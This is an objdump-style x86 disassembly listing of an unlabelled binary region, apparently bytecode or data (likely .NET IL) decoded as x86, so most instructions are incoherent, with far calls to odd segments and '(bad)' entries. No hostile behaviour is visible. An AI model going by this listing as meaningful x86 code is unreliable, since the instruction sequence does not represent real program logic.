  4039fe:	add    al,0x6f
  403a00:	sbb    al,BYTE PTR [eax]
  403a02:	add    BYTE PTR [edx],cl
  403a04:	outs   dx,DWORD PTR ds:[esi]
  403a05:	mov    BYTE PTR [eax],al
  403a07:	add    BYTE PTR [edx],cl
  403a09:	adc    esp,DWORD PTR [ebx]
  403a0b:	jb     0x403a72
  403a0d:	add    al,BYTE PTR [eax]
  403a0f:	jo     0x403a22
  403a11:	add    al,0x6f
  403a13:	sub    eax,DWORD PTR [eax]
  403a15:	add    BYTE PTR [edx],cl
  403a17:	sub    BYTE PTR [edi+0x0],al
  403a1a:	add    BYTE PTR [edx],cl
  403a1c:	sub    BYTE PTR [ecx],bl
  403a1e:	add    BYTE PTR [eax],al
  403a20:	or     dl,BYTE PTR [ecx]
  403a22:	and    ebp,DWORD PTR [esp+ecx*1]
  403a25:	sub    BYTE PTR ds:0x28060000,bh
  403a2b:	sbb    DWORD PTR [eax],eax
  403a2d:	add    BYTE PTR [edx],cl
  403a2f:	sub    ecx,DWORD PTR [edx]
  403a31:	sub    BYTE PTR [esi],bh
  403a33:	add    BYTE PTR [eax],al
  403a35:	push   es
  403a36:	sub    BYTE PTR [ecx],bl
  403a38:	add    BYTE PTR [eax],al
  403a3a:	or     ch,BYTE PTR [eax]
  403a3c:	das    
  403a3d:	add    BYTE PTR [eax],al
  403a3f:	or     ch,BYTE PTR [eax]
  403a41:	sbb    al,0x0
  403a43:	add    BYTE PTR [esi],al
  403a45:	pop    ss
  403a46:	lea    eax,[ecx]
  403a48:	add    BYTE PTR [eax],al
  403a4a:	add    DWORD PTR [ebx],edx
  403a4c:	cmp    eax,0x11163d11
  403a51:	add    eax,0x2b6f
  403a56:	or     ah,BYTE PTR [edx+0x32283d11]
  403a5c:	add    BYTE PTR [eax],al
  403a5e:	or     ch,BYTE PTR [eax]
  403a60:	sbb    BYTE PTR [eax],al
  403a62:	add    BYTE PTR [edx],cl
  403a64:	cmp    BYTE PTR [esi],ah
  403a66:	add    al,BYTE PTR [eax]
  403a68:	add    BYTE PTR [edi],dl
  403a6a:	adc    DWORD PTR [eax],ebx
  403a6c:	adc    ah,BYTE PTR [edx+edx*1]
  403a6f:	and    eax,0x27122612
  403a74:	adc    ch,BYTE PTR [eax]
  403a76:	sub    BYTE PTR [ebx],cl
  403a78:	add    BYTE PTR [eax],al
  403a7a:	push   es
  403a7b:	cmp    DWORD PTR [edi],ecx
  403a7d:	add    al,BYTE PTR [eax]
  403a7f:	add    BYTE PTR [eax],ch
  403a81:	sbb    al,BYTE PTR [eax]
  403a83:	add    BYTE PTR [esi],al
  403a85:	sub    BYTE PTR [eax],bl
  403a87:	add    BYTE PTR [eax],al
  403a89:	or     dl,BYTE PTR [ecx]
  403a8b:	and    al,0x11
  403a8d:	and    eax,0x1a6f2611
  403a92:	add    BYTE PTR [eax],al
  403a94:	or     dl,BYTE PTR [ecx]
  403a96:	daa    
  403a97:	adc    DWORD PTR [eax],ebp
  403a99:	pop    ss
  403a9a:	outs   dx,DWORD PTR ds:[esi]
  403a9b:	mov    DWORD PTR [eax],eax
  403a9d:	add    BYTE PTR [edx],cl
  403a9f:	sub    BYTE PTR es:[edx+0x0],bl
  403aa3:	add    BYTE PTR [esi],al
  403aa5:	sub    BYTE PTR [eax],bl
  403aa7:	add    BYTE PTR [eax],al
  403aa9:	or     dl,BYTE PTR [ecx]
  403aab:	and    al,0x11
  403aad:	and    eax,0x8a6f1614
  403ab2:	add    BYTE PTR [eax],al
  403ab4:	or     dl,BYTE PTR [ebx]
  403ab6:	sub    DWORD PTR [ecx],edx
  403ab8:	and    al,0x6f
  403aba:	mov    eax,DWORD PTR [eax]
  403abc:	add    BYTE PTR [edx],cl
  403abe:	adc    DWORD PTR ds:0x5282911,esp
  403ac4:	add    BYTE PTR [eax],al
  403ac6:	push   es
  403ac7:	cmp    bl,al
  403ac9:	add    DWORD PTR [eax],eax
  403acb:	add    BYTE PTR [eax],bl
  403acd:	adc    DWORD PTR [eax],ebx
  403acf:	adc    ch,BYTE PTR [edx]
  403ad1:	adc    ch,BYTE PTR [ebx]
  403ad3:	adc    ch,BYTE PTR [edx+edx*1]
  403ad6:	sub    eax,0xb282e12
  403adb:	add    BYTE PTR [eax],al
  403add:	push   es
  403ade:	cmp    DWORD PTR [ecx+eax*1+0x49280000],ebp
  403ae5:	add    BYTE PTR [eax],al
  403ae7:	push   es
  403ae8:	sub    BYTE PTR [eax],bl
  403aea:	add    BYTE PTR [eax],al
  403aec:	or     dl,BYTE PTR [ecx]
  403aee:	sub    dl,BYTE PTR [ecx]
  403af0:	sub    edx,DWORD PTR [esi+edx*1]
  403af3:	outs   dx,DWORD PTR ds:[esi]
  403af4:	mov    al,BYTE PTR [eax]
  403af6:	add    BYTE PTR [edx],cl
  403af8:	adc    ebp,DWORD PTR [edi]
  403afa:	adc    DWORD PTR [edi],ebp
  403afc:	adc    DWORD PTR [edi+ebp*2],ebp
  403aff:	sbb    al,BYTE PTR [eax]
  403b01:	add    BYTE PTR [edx],cl
  403b03:	outs   dx,DWORD PTR ds:[esi]
  403b04:	mov    WORD PTR [eax],es
  403b06:	add    BYTE PTR [edx],cl
  403b08:	adc    esi,DWORD PTR [eax]
  403b0a:	adc    DWORD PTR [eax],esi
  403b0c:	sub    al,0x35
  403b0e:	adc    DWORD PTR [eax],esi
  403b10:	outs   dx,DWORD PTR ds:[esi]
  403b11:	inc    ebx
  403b12:	add    BYTE PTR [eax],al
  403b14:	or     dl,BYTE PTR [ecx]
  403b16:	sub    eax,0x110c2d5f
  403b1b:	xor    BYTE PTR [edi+0x41],ch
  403b1e:	add    BYTE PTR [eax],al
  403b20:	or     dl,BYTE PTR [ecx]
  403b22:	cs pop edi
  403b24:	sub    al,0x1d
  403b26:	adc    DWORD PTR [edi],ebp
  403b28:	adc    DWORD PTR [edi+ebp*2],ebp
  403b2b:	sbb    al,BYTE PTR [eax]
  403b2d:	add    BYTE PTR [edx],cl
  403b2f:	adc    DWORD PTR ds:0x6f602e11,ebp
  403b35:	lea    eax,[eax]
  403b37:	add    BYTE PTR [edx],cl
  403b39:	adc    DWORD PTR es:[edx],ebp
  403b3c:	adc    DWORD PTR [edi],ebp
  403b3e:	outs   dx,DWORD PTR ds:[esi]
  403b3f:	mov    es,WORD PTR [eax]
  403b41:	add    BYTE PTR [edx],cl
  403b43:	sub    BYTE PTR [edx+0x0],bl
  403b46:	add    BYTE PTR [esi],al
  403b48:	sub    BYTE PTR [eax],bl
  403b4a:	add    BYTE PTR [eax],al
  403b4c:	or     dl,BYTE PTR [ecx]
  403b4e:	sub    ch,BYTE PTR [edi-0x75]
  403b51:	add    BYTE PTR [eax],al
  403b53:	or     dl,BYTE PTR [ecx]
  403b55:	sub    edx,DWORD PTR [ecx]
  403b57:	das    
  403b58:	sub    BYTE PTR ds:0x38060000,al
  403b5e:	sub    eax,0x19000001
  403b63:	adc    DWORD PTR [eax],ebx
  403b65:	adc    dh,BYTE PTR [ecx]
  403b67:	sub    BYTE PTR [eax+eax*1],cl
  403b6a:	add    BYTE PTR [esi],al
  403b6c:	cmp    DWORD PTR [esi],ebx
  403b6e:	add    DWORD PTR [eax],eax
  403b70:	add    BYTE PTR [eax],ch
  403b72:	das    
  403b73:	add    BYTE PTR [eax],al
  403b75:	or     ch,BYTE PTR [eax]
  403b77:	dec    ebp
  403b78:	add    BYTE PTR [eax],al
  403b7a:	push   es
  403b7b:	pop    ss
  403b7c:	lea    eax,[ecx]
  403b7e:	add    BYTE PTR [eax],al
  403b80:	add    DWORD PTR [ebx],edx
  403b82:	cmp    eax,0x11163d11
  403b87:	sbb    BYTE PTR [esi],dl
  403b89:	call   0x32:0x283d11a2
  403b90:	add    BYTE PTR [edx],cl
  403b92:	sub    BYTE PTR [eax],bl
  403b94:	add    BYTE PTR [eax],al
  403b96:	or     dl,BYTE PTR [ecx]
  403b98:	xor    DWORD PTR [edi-0x75],ebp
  403b9b:	add    BYTE PTR [eax],al
  403b9d:	or     dl,BYTE PTR [ecx]
  403b9f:	sbb    BYTE PTR [edi],dl
  403ba1:	call   0x9a17:0x18113111
  403ba8:	adc    al,0x16
  403baa:	outs   dx,DWORD PTR ds:[esi]
  403bab:	mov    al,BYTE PTR [eax]
  403bad:	add    BYTE PTR [edx],cl
  403baf:	sub    BYTE PTR ds:0x38060000,al
  403bb5:	(bad)  
  403bb6:	add    BYTE PTR [eax],al
  403bb8:	add    BYTE PTR [ecx],dl
  403bba:	sbb    BYTE PTR [esi+0x117b2c69],cl
  403bc0:	sbb    BYTE PTR [esi],dl
  403bc2:	call   0x1218:0x111a752c
  403bc9:	xor    ch,BYTE PTR [eax]
  403bcb:	or     al,0x0
  403bcd:	add    BYTE PTR [esi],al
  403bcf:	cmp    DWORD PTR [ebx+0x7e000000],edi
  403bd5:	sbb    eax,0x280a0000
  403bda:	sbb    BYTE PTR [eax],al
  403bdc:	add    BYTE PTR [edx],cl
  403bde:	sub    BYTE PTR [eax+0x0],dl
  403be1:	add    BYTE PTR [esi],al
  403be3:	adc    DWORD PTR [edx],esi
  403be5:	outs   dx,DWORD PTR ds:[esi]
  403be6:	mov    eax,DWORD PTR [eax]
  403be8:	add    BYTE PTR [edx],cl
  403bea:	outs   dx,DWORD PTR ds:[esi]
  403beb:	pop    DWORD PTR [eax]
  403bed:	add    BYTE PTR [edx],cl
  403bef:	sub    BYTE PTR [eax+0x110a0000],dl
  403bf5:	xor    ch,BYTE PTR [edi-0x75]
  403bf8:	add    BYTE PTR [eax],al
  403bfa:	or     ch,BYTE PTR [edi+0x3e]
  403bfd:	add    BYTE PTR [eax],al
  403bff:	or     ch,BYTE PTR [edi+0x3f]
  403c02:	add    BYTE PTR [eax],al
  403c04:	or     dl,BYTE PTR [ebx]
  403c06:	inc    ebx
  403c07:	sub    ebx,DWORD PTR [edx]
  403c09:	adc    DWORD PTR [ebx+0x6f],eax
  403c0c:	inc    eax
  403c0d:	add    BYTE PTR [eax],al
  403c0f:	or     dl,BYTE PTR [ebx]
  403c11:	xor    esi,DWORD PTR [edx+0x69]
  403c14:	add    al,BYTE PTR [eax]
  403c16:	jo     0x403c29
  403c18:	xor    ebp,DWORD PTR [edi+0x44]
  403c1b:	add    BYTE PTR [eax],al
  403c1d:	or     ch,BYTE PTR [eax]
  403c1f:	nop
  403c20:	add    BYTE PTR [eax],al
  403c22:	or     dl,BYTE PTR [ecx]
  403c24:	inc    ebx
  403c25:	outs   dx,DWORD PTR ds:[esi]
  403c26:	dec    eax
  403c27:	add    BYTE PTR [eax],al
  403c29:	or     ch,BYTE PTR ds:0x1161dedd
  403c2f:	inc    ebx
  403c30:	sub    al,0x7
  403c32:	adc    DWORD PTR [ebx+0x6f],eax
  403c35:	dec    ecx
  403c36:	add    BYTE PTR [eax],al
  403c38:	or     bl,ah
  403c3a:	jle    0x403c59
  403c3c:	add    BYTE PTR [eax],al
  403c3e:	or     ch,BYTE PTR [eax]
  403c40:	sbb    BYTE PTR [eax],al
  403c42:	add    BYTE PTR [edx],cl
  403c44:	sub    BYTE PTR [ecx+0x0],dl
  403c47:	add    BYTE PTR [esi],al
  403c49:	sub    BYTE PTR [eax],bl
  403c4b:	add    BYTE PTR [eax],al
  403c4d:	or     bh,BYTE PTR [esi+0xa]
  403c50:	add    BYTE PTR [eax],al
  403c52:	add    al,0x6f
  403c54:	xchg   ecx,eax
  403c55:	add    BYTE PTR [eax],al
  403c57:	or     ch,BYTE PTR [edi-0x6e]
  403c5a:	add    BYTE PTR [eax],al
  403c5c:	or     dl,BYTE PTR [ebx]
  403c5e:	inc    esp
  403c5f:	sub    edx,DWORD PTR ds:0x93284412
  403c65:	add    BYTE PTR [eax],al
  403c67:	or     dl,BYTE PTR [ebx]
  403c69:	xor    al,0x72
  403c6b:	jns    0x403c6f
  403c6d:	add    BYTE PTR [eax+0x11],dh
  403c70:	xor    al,0x28
  403c72:	nop
  403c73:	add    BYTE PTR [eax],al
  403c75:	or     dl,BYTE PTR [edx]
  403c77:	inc    esp
  403c78:	sub    BYTE PTR [eax+eax*1-0x1dd2f600],dl
  403c7f:	fimul  WORD PTR [esi]
  403c81:	adc    al,BYTE PTR [esi+edi*8+0x16]
  403c85:	or     BYTE PTR [eax],al
  403c87:	add    BYTE PTR [ebx],bl
  403c89:	outs   dx,DWORD PTR ds:[esi]
  403c8a:	dec    ecx
  403c8b:	add    BYTE PTR [eax],al
  403c8d:	or     bl,ah
  403c8f:	jb     0x403c9c
  403c91:	add    DWORD PTR [eax],eax
  403c93:	jo     0x403cbd
  403c95:	sbb    BYTE PTR [eax],al
  403c97:	add    BYTE PTR [edx],cl
  403c99:	sub    BYTE PTR [esi],ah
  403c9b:	add    BYTE PTR [eax],al
  403c9d:	push   es
  403c9e:	sub    BYTE PTR [eax],bl
  403ca0:	add    BYTE PTR [eax],al
  403ca2:	or     dl,BYTE PTR [esi]
  403ca4:	adc    esi,DWORD PTR [esi]
  403ca6:	fisubr WORD PTR [edx+0x13]
  403ca9:	xor    eax,0x1d7e
  403cae:	or     ch,BYTE PTR [eax]
  403cb0:	sbb    BYTE PTR [eax],al
  403cb2:	add    BYTE PTR [edx],cl
  403cb4:	sub    BYTE PTR [ebx],ch
  403cb6:	add    BYTE PTR [eax],al
  403cb8:	push   es
  403cb9:	sub    BYTE PTR [ecx],bl
  403cbb:	add    BYTE PTR [eax],al
  403cbd:	or     dl,BYTE PTR [ecx]
  403cbf:	xor    eax,0x956f
  403cc4:	or     ch,BYTE PTR [edx+edi*1]
  403cc7:	adc    DWORD PTR ds:0x956f,esi
  403ccd:	or     ch,BYTE PTR [edi+0x7a]
  403cd0:	add    BYTE PTR [eax],al
  403cd2:	or     ch,BYTE PTR [esp+ebp*1]
  403cd5:	adc    DWORD PTR ds:0x956f,esi
  403cdb:	or     ch,BYTE PTR [edi+0x7a]
  403cde:	add    BYTE PTR [eax],al
  403ce0:	or     ch,BYTE PTR [edi+0x3a]
  403ce3:	add    BYTE PTR [eax],al
  403ce5:	or     ch,BYTE PTR [edi+0x2c]
  403ce8:	add    BYTE PTR [eax],al
  403cea:	or     dl,BYTE PTR [esi]
  403cec:	xor    DWORD PTR [ebx],edx
  403cee:	adc    DWORD PTR ds:0x956f,esi
  403cf4:	or     ch,BYTE PTR [edi+0x7a]
  403cf7:	add    BYTE PTR [eax],al
  403cf9:	or     ch,BYTE PTR [eax]
  403cfb:	sbb    BYTE PTR [eax],al
  403cfd:	add    BYTE PTR [edx],cl
  403cff:	sub    ecx,DWORD PTR [ecx+edx*1]
  403d02:	xor    eax,0x7a6f
  403d07:	or     ch,BYTE PTR [eax]
  403d09:	sbb    BYTE PTR [eax],al
  403d0b:	add    BYTE PTR [edx],cl
  403d0d:	pop    ss
  403d0e:	adc    esi,DWORD PTR [esi]
  403d10:	fiadd  WORD PTR [eax]
  403d12:	adc    DWORD PTR [esi],esi
  403d14:	sub    al,BYTE PTR [eax]
  403d16:	add    BYTE PTR [eax],al
  403d18:	inc    ecx
  403d19:	xchg   esp,eax
  403d1a:	add    BYTE PTR [eax],al
  403d1c:	add    al,BYTE PTR [eax]
  403d1e:	add    BYTE PTR [eax],al
  403d20:	and    al,BYTE PTR [ebx]
  403d22:	add    BYTE PTR [eax],al
  403d24:	leave  
  403d25:	add    eax,DWORD PTR [eax]
  403d27:	add    bl,ch
  403d29:	push   es
  403d2a:	add    BYTE PTR [eax],al
  403d2c:	adc    eax,0x0
  403d31:	add    BYTE PTR [eax],al
  403d33:	add    BYTE PTR [edx],al
  403d35:	add    BYTE PTR [eax],al
  403d37:	add    BYTE PTR [edi+eax*1],ah
  403d3a:	add    BYTE PTR [eax],al
  403d3c:	and    al,BYTE PTR [eax]
  403d3e:	add    BYTE PTR [eax],al
  403d40:	inc    esi
  403d41:	pop    es
  403d42:	add    BYTE PTR [eax],al
  403d44:	adc    eax,0x0
  403d49:	add    BYTE PTR [eax],al
  403d4b:	add    BYTE PTR [eax],al
  403d4d:	add    BYTE PTR [eax],al
  403d4f:	add    BYTE PTR ds:0x9000008,bh
  403d55:	add    BYTE PTR [eax],al
  403d57:	add    BYTE PTR [esi+0x8],al
  403d5a:	add    BYTE PTR [eax],al
  403d5c:	push   ss
  403d5d:	add    BYTE PTR [eax],al
  403d5f:	add    BYTE PTR [ebx+0x0],al
  403d62:	add    BYTE PTR [ecx],al
  403d64:	add    al,BYTE PTR [eax]
  403d66:	add    BYTE PTR [eax],al
  403d68:	dec    ebx
  403d69:	adc    DWORD PTR [eax],eax
  403d6b:	add    BYTE PTR [edi],ah
  403d6d:	add    BYTE PTR [eax],al
  403d6f:	add    BYTE PTR [edx+0x11],dh
  403d72:	add    BYTE PTR [eax],al
  403d74:	or     al,0x0
  403d76:	add    BYTE PTR [eax],al
  403d78:	add    BYTE PTR [eax],al
  403d7a:	add    BYTE PTR [eax],al
  403d7c:	add    al,BYTE PTR [eax]
  403d7e:	add    BYTE PTR [eax],al
  403d80:	mov    ds:0x22000011,eax
  403d85:	add    BYTE PTR [eax],al
  403d87:	add    ch,al
  403d89:	adc    DWORD PTR [eax],eax
  403d8b:	add    BYTE PTR [esi],cl
	...
  403d95:	add    BYTE PTR [eax],al
  403d97:	add    BYTE PTR [eax+0x1],ah
  403d9a:	add    BYTE PTR [eax],al
  403d9c:	mov    WORD PTR [eax],ss
  403d9e:	add    BYTE PTR [eax],al
  403da0:	in     al,dx
  403da1:	adc    DWORD PTR [eax],eax
  403da3:	add    BYTE PTR [edx+0x0],ch
  403da6:	add    BYTE PTR [eax],al
  403da8:	inc    ebx
  403da9:	add    BYTE PTR [eax],al
  403dab:	add    DWORD PTR [ebx],ebx
  403dad:	xor    BYTE PTR ds:0x17300,al
  403db3:	add    BYTE PTR [ecx],cl
  403db5:	add    BYTE PTR [eax],al
  403db7:	adc    DWORD PTR ds:0x40e5114,eax
  403dbd:	adc    al,0x51
  403dbf:	push   cs
  403dc0:	add    eax,0x60e5416
  403dc5:	push   ss
  403dc6:	push   esp
  403dc7:	add    al,BYTE PTR [ebx]
  403dc9:	add    al,0x28
  403dcb:	or     al,0x0
  403dcd:	add    BYTE PTR [esi],al
  403dcf:	sub    eax,0x32a1602
  403dd4:	mov    gs,WORD PTR [ecx+0x1b]
  403dd7:	xor    dl,BYTE PTR [ebx+eax*1]
  403dda:	pop    ss
  403ddb:	call   0x2c9a:0x18030f2c
  403de2:	or     al,BYTE PTR [ebx]
  403de4:	sbb    DWORD PTR [edx+0x1a03052c],ebx
  403dea:	call   0x0:0x35280b2d
  403df1:	push   es
  403df2:	jae    0x403e49
  403df4:	add    BYTE PTR [eax],al
  403df6:	or     bh,BYTE PTR [edx+0x5]
  403df9:	add    edx,DWORD PTR [edi]
  403dfb:	call   0x30a:0x9a180351
  403e02:	sbb    DWORD PTR [edx+0x30c160b],ebx
  403e08:	sbb    bl,BYTE PTR [edx+0x4d28]
  403e0e:	or     ch,BYTE PTR [edi+0x72]
  403e11:	add    BYTE PTR [eax],al
  403e13:	or     cl,BYTE PTR ds:0x28b7209
  403e19:	add    BYTE PTR [eax+0x28],dh
  403e1c:	cmp    DWORD PTR [eax],eax
  403e1e:	add    BYTE PTR [edx],cl
  403e20:	sub    eax,0x9772090d
  403e25:	add    al,BYTE PTR [eax]
  403e27:	jo     0x403e51
  403e29:	cmp    DWORD PTR [eax],eax
  403e2b:	add    BYTE PTR [edx],cl
  403e2d:	sub    al,0x4
  403e2f:	push   ss
  403e30:	or     al,0x2b
  403e32:	inc    edx
  403e33:	or     DWORD PTR [edx-0x5d],esi
  403e36:	add    al,BYTE PTR [eax]
  403e38:	jo     0x403e62
  403e3a:	cmp    DWORD PTR [eax],eax
  403e3c:	add    BYTE PTR [edx],cl
  403e3e:	sub    eax,0xad72090d
  403e43:	add    al,BYTE PTR [eax]
  403e45:	jo     0x403e6f
  403e47:	cmp    DWORD PTR [eax],eax
  403e49:	add    BYTE PTR [edx],cl
  403e4b:	sub    al,0x4
  403e4d:	pop    ss
  403e4e:	or     al,0x2b
  403e50:	and    al,0x28
  403e52:	das    
  403e53:	add    BYTE PTR [eax],al
  403e55:	or     ch,BYTE PTR [eax]
  403e57:	aaa    
  403e58:	add    BYTE PTR [eax],al
  403e5a:	push   es
  403e5b:	pop    ss
  403e5c:	lea    eax,[ecx]
  403e5e:	add    BYTE PTR [eax],al
  403e60:	add    DWORD PTR [ebx],edx
  403e62:	push   es
  403e63:	adc    DWORD PTR [esi],eax
  403e65:	push   ss
  403e66:	or     DWORD PTR [edx+0x32280611],esp
  403e6c:	add    BYTE PTR [eax],al
  403e6e:	or     dh,BYTE PTR [ebx+0x55]
  403e71:	add    BYTE PTR [eax],al
  403e73:	or     bh,BYTE PTR [edx+0xe]
  403e76:	add    al,0x7
  403e78:	push   ss
  403e79:	pop    ss
  403e7a:	pop    ss
  403e7b:	sub    BYTE PTR [eax],cl
  403e7d:	add    BYTE PTR [eax],al
  403e7f:	push   es
  403e80:	push   ecx
  403e81:	add    al,0x50
  403e83:	outs   dx,DWORD PTR ds:[esi]
  403e84:	mov    eax,DWORD PTR [eax]
  403e86:	add    BYTE PTR [edx],cl
  403e88:	push   es
  403e89:	outs   dx,DWORD PTR ds:[esi]
  403e8a:	xchg   esi,eax
  403e8b:	add    BYTE PTR [eax],al
  403e8d:	or     dl,BYTE PTR [ebx]
  403e8f:	add    al,0x11
  403e91:	add    al,0x2d
  403e93:	jg     0x403f13
  403e95:	sbb    eax,0x280a0000
  403e9a:	sbb    BYTE PTR [eax],al
  403e9c:	add    BYTE PTR [edx],cl
  403e9e:	sub    BYTE PTR [eax],bh
  403ea0:	add    BYTE PTR [eax],al
  403ea2:	push   es
  403ea3:	push   es
  403ea4:	add    al,0x50
  403ea6:	outs   dx,DWORD PTR ds:[esi]
  403ea7:	mov    eax,DWORD PTR [eax]
  403ea9:	add    BYTE PTR [edx],cl
  403eab:	outs   dx,DWORD PTR ds:[esi]
  403eac:	pop    DWORD PTR [eax]
  403eae:	add    BYTE PTR [edx],cl
  403eb0:	sub    BYTE PTR [edi+0x280a0000],dl
  403eb6:	push   eax
  403eb7:	add    BYTE PTR [eax],al
  403eb9:	push   es
  403eba:	add    al,0x50
  403ebc:	outs   dx,DWORD PTR ds:[esi]
  403ebd:	mov    eax,DWORD PTR [eax]
  403ebf:	add    BYTE PTR [edx],cl
  403ec1:	outs   dx,DWORD PTR ds:[esi]
  403ec2:	pop    DWORD PTR [eax]
  403ec4:	add    BYTE PTR [edx],cl
  403ec6:	sub    BYTE PTR [eax+0x40a0000],dl
  403ecc:	push   eax
  403ecd:	outs   dx,DWORD PTR ds:[esi]
  403ece:	mov    eax,DWORD PTR [eax]
  403ed0:	add    BYTE PTR [edx],cl
  403ed2:	outs   dx,DWORD PTR ds:[esi]
  403ed3:	add    BYTE PTR ds:[eax],al
  403ed6:	or     ch,BYTE PTR [edi+0x3f]
  403ed9:	add    BYTE PTR [eax],al
  403edb:	or     dl,BYTE PTR [ebx]
  403edd:	pop    es
  403ede:	sub    ebx,DWORD PTR [edx]
  403ee0:	adc    DWORD PTR [edi],eax
  403ee2:	outs   dx,DWORD PTR ds:[esi]
  403ee3:	inc    eax
  403ee4:	add    BYTE PTR [eax],al
  403ee6:	or     dl,BYTE PTR [ebx]
  403ee8:	add    eax,0x26972
  403eed:	jo     0x403f00
  403eef:	add    eax,0x446f
  403ef4:	or     ch,BYTE PTR [eax]
  403ef6:	nop
  403ef7:	add    BYTE PTR [eax],al
  403ef9:	or     dl,BYTE PTR [ecx]
  403efb:	pop    es
  403efc:	outs   dx,DWORD PTR ds:[esi]
  403efd:	dec    eax
  403efe:	add    BYTE PTR [eax],al
  403f00:	or     ch,BYTE PTR ds:0x110cdedd
  403f06:	pop    es
  403f07:	sub    al,0x7
  403f09:	adc    DWORD PTR [edi],eax
  403f0b:	outs   dx,DWORD PTR ds:[esi]
  403f0c:	dec    ecx
  403f0d:	add    BYTE PTR [eax],al
  403f0f:	or     bl,ah
  403f11:	push   ss
  403f12:	sub    cl,BYTE PTR [esi]
  403f14:	add    eax,0x11042d08
  403f19:	add    al,0x2b
  403f1b:	add    DWORD PTR [esi],edx
  403f1d:	push   esp
  403f1e:	push   cs
  403f1f:	push   es
  403f20:	or     BYTE PTR ds:0x22b1603,ch
  403f26:	adc    DWORD PTR [esp+edx*2],eax
  403f29:	pop    ss
  403f2a:	sub    al,BYTE PTR [eax]
  403f2c:	add    DWORD PTR [eax],edx
  403f2e:	add    BYTE PTR [eax],al
  403f30:	add    al,BYTE PTR [eax]
  403f32:	add    DWORD PTR es:[edi],esp
  403f35:	dec    ebp
  403f36:	add    DWORD PTR [eax+eax*1],ecx
  403f39:	add    BYTE PTR [eax],al
  403f3b:	add    BYTE PTR [ebx],bl
  403f3d:	xor    BYTE PTR [ebx],al
  403f3f:	add    cl,bl
  403f41:	add    BYTE PTR [eax],al
  403f43:	add    BYTE PTR [edx],cl
  403f45:	add    BYTE PTR [eax],al
  403f47:	adc    DWORD PTR [esp+edx*1],eax
  403f4a:	push   ecx
  403f4b:	add    edx,DWORD PTR [esi]
  403f4d:	call   0x400:0xa7e0a
  403f54:	push   es
  403f55:	add    al,0x6f
  403f57:	cwde   
  403f58:	add    BYTE PTR [eax],al
  403f5a:	or     bh,BYTE PTR [edx]
  403f5c:	mov    edi,0x7e000000
  403f61:	or     DWORD PTR [eax],eax
  403f63:	add    BYTE PTR [esi*2+0x1000050],al
  403f6a:	sub    al,0x9
  403f6c:	add    ebx,DWORD PTR [edx]
  403f6e:	call   0x5f33:0x1a02042d
  403f75:	jle    0x403f94
  403f77:	add    BYTE PTR [eax],al
  403f79:	or     ch,BYTE PTR [eax]
  403f7b:	sbb    BYTE PTR [eax],al
  403f7d:	add    BYTE PTR [edx],cl
  403f7f:	sub    BYTE PTR [edi+0x0],cl
  403f82:	add    BYTE PTR [esi],al
  403f84:	push   es
  403f85:	sub    BYTE PTR [eax+0x280a0000],dl
  403f8b:	push   ecx
  403f8c:	add    BYTE PTR [eax],al
  403f8e:	push   es
  403f8f:	sub    BYTE PTR [eax],bl
  403f91:	add    BYTE PTR [eax],al
  403f93:	or     bh,BYTE PTR [esi+0xa]
  403f96:	add    BYTE PTR [eax],al
  403f98:	add    al,0x6f
  403f9a:	xchg   ecx,eax
  403f9b:	add    BYTE PTR [eax],al
  403f9d:	or     ch,BYTE PTR [edi-0x6e]
  403fa0:	add    BYTE PTR [eax],al
  403fa2:	or     cl,BYTE PTR [ebx+ebp*1]
  403fa5:	adc    edx,DWORD PTR [edx]
  403fa7:	add    ch,BYTE PTR [eax]
  403fa9:	xchg   ebx,eax
  403faa:	add    BYTE PTR [eax],al
  403fac:	or     cl,BYTE PTR [ebx]
  403fae:	jb     0x404029
  403fb0:	add    al,BYTE PTR [eax]
  403fb2:	jo     0x403fbb
  403fb4:	sub    BYTE PTR [eax+0x120a0000],dl
  403fba:	add    ch,BYTE PTR [eax]
  403fbc:	xchg   esp,eax
  403fbd:	add    BYTE PTR [eax],al
  403fbf:	or     ch,BYTE PTR ds:0x120edee4
  403fc5:	add    bh,dh
  403fc7:	push   ss
  403fc8:	or     BYTE PTR [eax],al
  403fca:	add    BYTE PTR [ebx],bl
  403fcc:	outs   dx,DWORD PTR ds:[esi]
  403fcd:	dec    ecx
  403fce:	add    BYTE PTR [eax],al
  403fd0:	or     bl,ah
  403fd2:	push   ss
  403fd3:	sub    bh,BYTE PTR [esi+0x1d]
  403fd6:	add    BYTE PTR [eax],al
  403fd8:	or     ch,BYTE PTR [eax]
  403fda:	sbb    BYTE PTR [eax],al
  403fdc:	add    BYTE PTR [edx],cl
  403fde:	sub    BYTE PTR [ecx+0x0],bl
  403fe1:	add    BYTE PTR [esi],al
  403fe3:	push   es
  403fe4:	sub    BYTE PTR [eax+0x7e0a0000],dl
  403fea:	sbb    eax,0x280a0000
  403fef:	sbb    BYTE PTR [eax],al
  403ff1:	add    BYTE PTR [edx],cl
  403ff3:	add    cl,BYTE PTR ds:0x45591709
  403ff9:	add    al,BYTE PTR [eax]
  403ffb:	add    BYTE PTR [eax],al
  403ffd:	add    al,BYTE PTR [eax]
  403fff:	add    BYTE PTR [eax],al
  404001:	or     al,BYTE PTR [eax]
  404003:	add    BYTE PTR [eax],al
  404005:	sub    edx,DWORD PTR [eax]
  404007:	add    ebp,DWORD PTR [eax]
  404009:	sldt   WORD PTR [eax]
  40400c:	push   es
  40400d:	sub    ecx,DWORD PTR [esi]
  40400f:	add    ebp,DWORD PTR [eax]
  404011:	push   cs
  404012:	add    BYTE PTR [eax],al
  404014:	push   es
  404015:	sub    eax,DWORD PTR [esi]
  404017:	add    ebp,DWORD PTR [eax]
  404019:	or     eax,0x16060000
  40401e:	sub    dl,BYTE PTR [edi]
  404020:	sub    al,BYTE PTR [eax]
  404022:	add    BYTE PTR [eax],al
  404024:	add    DWORD PTR [eax],edx
  404026:	add    BYTE PTR [eax],al
  404028:	add    al,BYTE PTR [eax]
  40402a:	pop    esp
  40402b:	add    BYTE PTR [eax],ah
  40402d:	jl     0x40402f
  40402f:	push   cs
  404030:	add    BYTE PTR [eax],al
  404032:	add    BYTE PTR [eax],al
  404034:	adc    esi,DWORD PTR [eax]
  404036:	push   es
  404037:	add    BYTE PTR [eax],bh
  404039:	add    BYTE PTR [eax],al
  40403b:	add    BYTE PTR ds:0x28110000,al
  404041:	das    
  404042:	add    BYTE PTR [eax],al
  404044:	or     ch,BYTE PTR [eax]
  404046:	dec    ebp
  404047:	add    BYTE PTR [eax],al
  404049:	push   es
  40404a:	pop    ss
  40404b:	lea    eax,[ecx]
  40404d:	add    BYTE PTR [eax],al
  40404f:	add    DWORD PTR [edx],ecx
  404051:	push   es
  404052:	push   ss
